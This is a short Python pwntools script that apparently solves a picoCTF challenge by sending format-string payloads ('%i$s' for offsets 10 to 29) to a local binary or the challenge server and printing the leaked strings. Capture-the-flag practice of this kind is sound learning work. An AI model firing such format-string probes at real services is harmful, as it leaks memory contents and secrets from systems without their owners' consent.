#!/usr/bin/env python3

from pwn import *

HOST = "saturn.picoctf.net"
PORT = 62646

exe = ELF("./vuln")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'warn'

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()
    for i in range(10, 30):
        try:
            r = conn()
            payload = f"%{i}$s"
            r.sendlineafter('you one >>', payload)
            output = r.recvline()
            output = r.recvline()
            print(f"{i}: {output}")
        except:
            pass


    r.interactive()


if __name__ == "__main__":
    main()

